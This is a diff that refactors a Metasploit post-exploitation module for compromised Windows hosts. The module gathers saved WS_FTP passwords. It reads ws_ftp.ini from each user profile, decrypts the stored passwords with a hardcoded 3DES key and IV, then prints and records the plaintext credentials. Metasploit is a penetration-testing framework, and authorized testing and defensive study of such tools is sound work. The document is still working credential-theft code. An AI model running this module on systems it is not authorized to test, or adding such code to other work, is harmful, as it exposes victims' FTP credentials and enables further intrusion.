@@ -1,37 +1,46 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-require 'rex/parser/ini'
-require 'msf/core/auxiliary/report'
-
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather WS_FTP Saved Password Extraction',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather WS_FTP Saved Password Extraction',
+        'Description' => %q{
           This module extracts weakly encrypted saved FTP Passwords
           from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'theLightCosine'],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'theLightCosine'],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_channel_eof
+              core_channel_open
+              core_channel_read
+              core_channel_write
+              stdapi_fs_stat
+            ]
+          }
+        }
+      )
+    )
   end
 
   def run
     print_status("Checking Default Locations...")
     grab_user_profiles().each do |user|
       next if user['AppData'] == nil
+
       check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini")
       check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP Home\\Sites\\ws_ftp.ini")
     end
@@ -54,16 +63,18 @@ class Metasploit3 < Msf::Post
 
     ini.each_key do |group|
       next if group == "_config_"
+
       print_status("Processing Saved Session #{group}")
       host = ini[group]['HOST']
       host = host.delete "\""
       username = ini[group]['UID']
       username = username.delete "\""
-      port = 	ini[group]['PORT']
+      port =	ini[group]['PORT']
       passwd = ini[group]['PWD']
       passwd = decrypt(passwd)
 
       next if passwd == nil or passwd == ""
+
       port = 21 if port == nil
       print_good("Host: #{host} Port: #{port} User: #{username}  Password: #{passwd}")
       service_data = {
@@ -99,7 +110,7 @@ class Metasploit3 < Msf::Post
     decoded = pwd.unpack("m*")[0]
     key = "\xE1\xF0\xC3\xD2\xA5\xB4\x87\x96\x69\x78\x4B\x5A\x2D\x3C\x0F\x1E\x34\x12\x78\x56\xab\x90\xef\xcd"
     iv = "\x34\x12\x78\x56\xab\x90\xef\xcd"
-    des = OpenSSL::Cipher::Cipher.new("des-ede3-cbc")
+    des = OpenSSL::Cipher.new("des-ede3-cbc")
 
     des.decrypt
     des.key = key
